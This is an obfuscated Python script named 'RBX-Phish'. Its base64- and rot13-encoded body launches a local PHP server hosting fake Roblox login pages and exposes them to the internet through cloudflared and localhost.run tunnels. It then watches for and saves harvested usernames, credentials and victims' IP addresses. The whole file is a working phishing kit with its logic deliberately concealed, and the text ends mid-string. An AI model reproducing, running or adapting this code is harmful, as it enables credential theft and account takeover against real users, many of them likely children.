# RBX-Phish
# By: Euronymou5

import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmZyb20gcmUgaW1wb3J0IHNlYXJjaApmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZQpmcm9tIHN1YnByb2Nlc3MgaW1wb3J0IERFVk5VTEwsIFBJUEUsIFBvcGVuLCBTVERPVVQKCmRlZiBjYXQoZmlsZSk6CiAgICBpZiBpc2ZpbGUoZmlsZSk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGUsICJyIikgYXMgZmlsZWRhdGE6CiAgICAgICAgICAgIHJldHVybiBmaWxlZGF0YS5yZWFkKCkKICAgIHJldHVybiAiIgoKZXJyb3JfZmlsZSA9ICJsb2dzL2Vycm9yLmxvZyIKCmRlZiBhcHBlbmQodGV4dCwgZmlsZW5hbWUpOgogICAgd2l0aCBvcGVuKGZpbGVuYW1lLCAiYSIpIGFzIGZpbGU6CiAgICAgICAgZmlsZS53cml0ZShzdHIodGV4dCkrIlxuIikKCmRlZiBncmVwKHJlZ2V4LCB0YXJnZXQpOgogICAgaWYgaXNmaWxlKHRhcmdldCk6CiAgICAgICAgY29udGVudCA9IGNhdCh0YXJnZXQpCiAgICBlbHNlOgogICAgICAgIGNvbnRlbnQgPSB0YXJnZXQKICAgIHJlc3VsdHMgPSBzZWFyY2gocmVnZXgsIGNvbnRlbnQpCiAgICBpZiByZXN1bHRzIGlzIG5vdCBOb25lOgogICAgICAgIHJldHVybiByZXN1bHRzLmdyb3VwKDEpCiAgICByZXR1cm4gIiIKCmRlZiBiZ3Rhc2soY29tbWFuZCwgc3Rkb3V0PVBJUEUsIHN0ZGVycj1ERVZOVUxMLCBjd2Q9Ii4vIik6CiAgICB0cnk6CiAgICAgICAgcmV0dXJuIFBvcGVuKGNvbW1hbmQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdGRvdXQsIHN0ZGVycj1zdGRlcnIsIGN3ZD1jd2QpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgYXBwZW5kKGUsIGVycm9yX2ZpbGUpCgpjZl9maWxlID0gImxvZ3MvY2YubG9nIgpsaHJfZmlsZSA9ICJsb2dzL2xoci5sb2ciCmNmX2xvZyA9IG9wZW4oY2ZfZmlsZSwgJ3cnKQpsaHJfbG9nID0gb3BlbihsaHJfZmlsZSwgJ3cnKQoKCmlmIG9zLnBhdGguaXNmaWxlKCdzZXJ2ZXIvY2xvdWRmbGFyZWQnKToKICAgcGFzcwplbHNlOgogIHByaW50KCdcblwwMzNbMzFtWyFdIENsb3VkZmxhcmUgbm8gZXN0YSBpbnN0YWxhZG8uJykKICBwcmludCgnXG5cMDMzWzM1bVt+XSBJbnN0YWxhbmRvIGNsb3VkZmxhcmUuLi4nKQogIG9zLnN5c3RlbSgiYmFzaCBtb2R1bGVzL2luc3RhbGwuc2giKQoKZGVmIHNwYW5pc2htZW51KCk6CiAgb3Muc3lzdGVtKCJjbGVhciIpCiAgcHJpbnQoJ1wwMzNbMzVt4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZcgIOKWiOKWiOKVlyAgICBcMDMzWzM2bSDilojilojilojilojilojilojilZcg4paI4paI4pWXICDilojilojilZfilojilojilZfilojilojilojilojilojilojilojilZfilojilojilZcgIOKWiOKWiCcpCiAgdGltZS5zbGVlcCgwLjUpCiAgcHJpbnQoJ1wwMzNbMzVt4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4paI4paI4pWX4paI4paI4pWU4pWdICAgIFwwMzNbMzZtIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWRICDilojilojilZEnKQogIHRpbWUuc2xlZXAoMC41KQogIHByaW50KCdcMDMzWzM1beKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSDilZrilojilojilojilZTilZ1cMDMzWzM1beKWiOKWiFwwMzNbMzZt4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWRJykKICB0aW1lLnNsZWVwKDAuNSkKICBwcmludCgnXDAzM1szNW3ilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZcg4paI4paI4pWU4paI4paI4pWXXDAzM1szNm3ilZrilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilZDilZ0g4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWR4pWa4pWQ4pWQ4pWQ4pWQ4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWRJykKICB0aW1lLnNsZWVwKDAuNSkKICBwcmludCgnXDAzM1szNW3ilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVlOKVnSDilojilojilZcgIFwwMzNbMzZtICAg4paI4paI4pWRICAgICDilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkSAg4paI4paI4pWRJykKICB0aW1lLnNsZWVwKDAuNSkKICBwcmludCgnXDAzM1szNW3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZ0gIOKVmuKVkOKVnSAgXDAzM1szNm0gICDilZrilZDilZ0gICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0nKQogIHByaW50KCdcMDMzWzMzbSAgICAgICAtLS0tLS0tLS0tfEJ5OiBFdXJvbnltb3U1fC0tLS0tLS0tLS0nKQogIHByaW50KCdcblwwMzNbMzFtW35dIFNlbGVjY2lvbmEgZWwgaWRpb21hIGRlIGxhIHBhZ2luYTonKQogIHByaW50KCdcblsxXSBFc3Bhw7FvbCcpCiAgcHJpbnQoJ1xuWzJdIEluZ2xlcycpCiAgbnVtID0gaW50KGlucHV0KCdcbj4+ICcpKQogIGlmIG51bSA9PSAxOgogICAgcHJpbnQoJ1xuW35dIEluaWNpYW5kbyBzZXJ2aWRvciBwaHAuLi4nKQogICAgb3Muc3lzdGVtKCJwaHAgLVMgbG9jYWxob3N0OjgwODAgLXQgcGFnZXMvcm9ibG94X2VzID4gL2Rldi9udWxsIDI+JjEgJiIpCiAgICB0aW1lLnNsZWVwKDIpCiAgICBwcmludCgnW35dIFNlcnZpZG9yIHBocDog4pyU77iPJykKICAgIHByaW50KCdbfl0gQ3JlYW5kbyBsaW5rcy4uLicpCiAgICBiZ3Rhc2soIi4vc2VydmVyL2Nsb3VkZmxhcmVkIHR1bm5lbCAtdXJsIGxvY2FsaG9zdDo4MDgwIiwgc3Rkb3V0PWNmX2xvZywgc3RkZXJyPWNmX2xvZykKICAgIGJndGFzaygic3NoIC1SIDgwOmxvY2FsaG9zdDo4MDgwIG5va2V5QGxvY2FsaG9zdC5ydW4gLVQgLW4iLCBzdGRvdXQ9bGhyX2xvZywgc3RkZXJyPWxocl9sb2cpCiAgICBjZl9zdWNjZXNzID0gRmFsc2UKICAgIGZvciBpIGluIHJhbmdlKDEwKToKICAgICAgICBjZl91cmwgPSBncmVwKCIoaHR0cHM6Ly9bLTAtOWEtei5dezQsfS50cnljbG91ZGZsYXJlLmNvbSkiLCBjZl9maWxlKQogICAgICAgIGlmIGNmX3VybCAhPSAiIjoKICAgICAgICAgICAgY2Zfc3VjY2VzcyA9IFRydWUKICAgICAgICAgICAgYnJlYWsKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICBmb3IgaSBpbiByYW5nZSgxMCk6CiAgICAgICAgbGhyX3'
love = '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'
god = 'lojilojilojilZTilZ3ilojilojilojilojilojilojilZTilZ0g4pWa4paI4paI4paI4pWU4pWdXDAzM1szNW3ilojilohcMDMzWzM2beKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkScpCiAgdGltZS5zbGVlcCgwLjUpCiAgcHJpbnQoJ1wwMzNbMzVt4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXIOKWiOKWiOKVlOKWiOKWiOKVl1wwMzNbMzZt4pWa4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWdIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkeKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkScpCiAgdGltZS5zbGVlcCgwLjUpCiAgcHJpbnQoJ1wwMzNbMzVt4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilZTilZ3ilojilojilZTilZ0g4paI4paI4pWXICBcMDMzWzM2bSAgIOKWiOKWiOKVkSAgICAg4paI4paI4pWRICDilojilojilZHilojilojilZHilojilojilojilojilojilojilojilZHilojilojilZEgIOKWiOKWiOKVkScpCiAgdGltZS5zbGVlcCgwLjUpCiAgcHJpbnQoJ1wwMzNbMzVt4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWdICDilZrilZDilZ0gIFwwMzNbMzZtICAg4pWa4pWQ4pWdICAgICDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdJykKICBwcmludCgnXDAzM1szM20gICAgICAgLS0tLS0tLS0tLXxCeTogRXVyb255bW91NXwtLS0tLS0tLS0tJykKICBwcmludCgnXG5cMDMzWzMxbVt+XSBTZWxlY3QgdGhlIGxhbmd1YWdlIG9mIHRoZSBwYWdlOicpCiAgcHJpbnQoJ1xuWzFdIFNwYW5pc2gnKQogIHByaW50KCdcblsyXSBFbmdsaXNoJykKICBudW0gPSBpbnQoaW5wdXQoJ1xuPj4gJykpCiAgaWYgbnVtID09IDE6CiAgICBwcmludCgnXG5bfl0gU3RhcnRpbmcgcGhwIHNlcnZlci4uLicpCiAgICBvcy5zeXN0ZW0oInBocCAtUyBsb2NhbGhvc3Q6ODA4MCAtdCBwYWdlcy9yb2Jsb3hfZXMgPiAvZGV2L251bGwgMj4mMSAmIikKICAgIHRpbWUuc2xlZXAoMikKICAgIHByaW50KCdbfl0gcGhwIHNlcnZlcjog4pyU77iPJykKICAgIHByaW50KCdbfl0gQ3JlYXRpbmcgbGlua3MuLi4nKQogICAgYmd0YXNrKCIuL3NlcnZlci9jbG91ZGZsYXJlZCB0dW5uZWwgLXVybCBsb2NhbGhvc3Q6ODA4MCIsIHN0ZG91dD1jZl9sb2csIHN0ZGVycj1jZl9sb2cpCiAgICBiZ3Rhc2soInNzaCAtUiA4MDpsb2NhbGhvc3Q6ODA4MCBub2tleUBsb2NhbGhvc3QucnVuIC1UIC1uIiwgc3Rkb3V0PWxocl9sb2csIHN0ZGVycj1saHJfbG9nKQogICAgY2Zfc3VjY2VzcyA9IEZhbHNlCiAgICBmb3IgaSBpbiByYW5nZSgxMCk6CiAgICAgICAgY2ZfdXJsID0gZ3JlcCgiKGh0dHBzOi8vWy0wLTlhLXouXXs0LH0udHJ5Y2xvdWRmbGFyZS5jb20pIiwgY2ZfZmlsZSkKICAgICAgICBpZiBjZl91cmwgIT0gIiI6CiAgICAgICAgICAgIGNmX3N1Y2Nlc3MgPSBUcnVlCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgZm9yIGkgaW4gcmFuZ2UoMTApOgogICAgICAgIGxocl91cmwgPSBncmVwKCIoaHR0cHM6Ly9bLTAtOWEtei5dKi5saHIubGlmZSkiLCBsaHJfZmlsZSkKICAgICAgICBpZiBsaHJfdXJsICE9ICIiOgogICAgICAgICAgICBsaHJfc3VjY2VzcyA9IFRydWUKICAgICAgICAgICAgYnJlYWsKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICBwcmludChmJ1t+XSBMaW5rOiB7Y2ZfdXJsfScpCiAgICBwcmludChmJ1xuW35dIExvY2FsaG9zdC5ydW4ge2xocl91cmx9JykKICAgIHByaW50KCdcblt+XSBXYWl0aW5nIGZvciBkYXRhLi4uJykKICAgIHdoaWxlIFRydWU6CiAgICAgIGlmIG9zLnBhdGguaXNmaWxlKCdwYWdlcy9yb2Jsb3hfZXMvdXN1YXJpb3MudHh0Jyk6CiAgICAgICAgcHJpbnQoJ1xuXDAzM1szMW1bIV0gVXNlcnMgZm91bmQhJykKICAgICAgICBwcmludCgnXDAzM1szMW0nKQogICAgICAgIG9zLnN5c3RlbSgiY2F0IHBhZ2VzL3JvYmxveF9lcy91c3Vhcmlvcy50eHQiKQogICAgICAgIG9zLnN5c3RlbSgiY2F0IHBhZ2VzL3JvYmxveF9lcy91c3Vhcmlvcy50eHQgPj4gcGFnZXMvcm9ibG94X2VzL3VzdWFyaW9zX2d1YXJkYWRvcy50eHQiKQogICAgICAgIG9zLnN5c3RlbSgicm0gLXJmIHBhZ2VzL3JvYmxveF9lcy91c3Vhcmlvcy50eHQiKQogICAgICAgIHByaW50KCdcblwwMzNbMzRtW35dIFVzZXJzIHNhdmVkIGluOiB1c3Vhcmlvc19ndWFyZGFkb3MudHh0JykKICAgICAgaWYgb3MucGF0aC5pc2ZpbGUoJ3BhZ2VzL3JvYmxveF9lcy9pcC50eHQnKToKICAgICAgICBwcmludCgnXG5cMDMzWzMxbVshXSBJUCBmb3VuZCEnKQogICAgICAgIHByaW50KCdcMDMzWzMxbScpCiAgICAgICAgb3Muc3lzdGVtKCJjYXQgcGFnZXMvcm9ibG94X2VzL2lwLnR4dCIpCiAgICAgICAgb3Muc3lzdGVtKCJjYXQgcGFnZXMvcm9ibG94X2VzL2lwLnR4dCA+PiBwYWdlcy9yb2Jsb3hfZXMvaXBfZ3VhcmRhZG9zLnR4dCIpCiAgICAgICAgb3Muc3lzdGVtKCJybSAtcmYgcGFnZXMvcm9ibG94X2VzL2lwLnR4dCIpCiAgICAgICAgcHJpbnQoJ1xuXDAzM1szNG1bfl0gSVAgc2F2ZWQgaW46IGlwX2d1YXJkYWRvcy50eHQnKQogIGVsaWYgbnVtID09IDI6CiAgICAgIHByaW50KCdcblt+XSBTdGFydGluZyBwaHAgc2VydmVyLi4uJykKICAgICAgb3Muc3lzdGVtKCJwaHAgLVMgbG9jYWxob3N0OjgwODAgLXQgcGFnZXMvcm9ibG94X2VuID4gL2Rldi9udWxsIDI+JjEgJiIpCiAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgcHJpbnQoJ1t+XSBwaHAgc2VydmVyOiDinJTvuI8nKQogICAgICBwcmludCgnW35dIENyZWF0aW5nIGxpbmtzLi4uJykKICAgICAgYmd0YXNrKCIuL3NlcnZlci9jbG91ZGZsYXJlZCB0dW5uZWwgLXVybCBsb2NhbGhvc3Q6ODA4MCIsIHN0ZG91dD1jZl9sb2csIHN0ZGVycj1jZl9sb2cpCiAgICAgIGJndGFzaygic3NoIC1SIDgwOmxvY2FsaG9zdDo4MDgwIG5va2V5QGxvY2FsaG9zdC5ydW4gLVQgLW4iLCBzdGRvdXQ9bGhyX2xvZywgc3RkZXJyPWxocl9sb2cpCiAgICAgIGNmX3N1Y2Nlc3MgPSBGYWxzZQogICAgICBmb3IgaSBpbiByYW5nZSgxMCk6CiAgICAgICAgY2ZfdXJsID0gZ3JlcCgiKGh0dHBzOi8vWy0wLTlhLXouXXs0LH0udHJ5Y2xvdWRmbGFyZS5jb20pIiwgY2ZfZmlsZSkKICAgICAgICBpZiBjZl91cmwgIT0gIi'
destiny = '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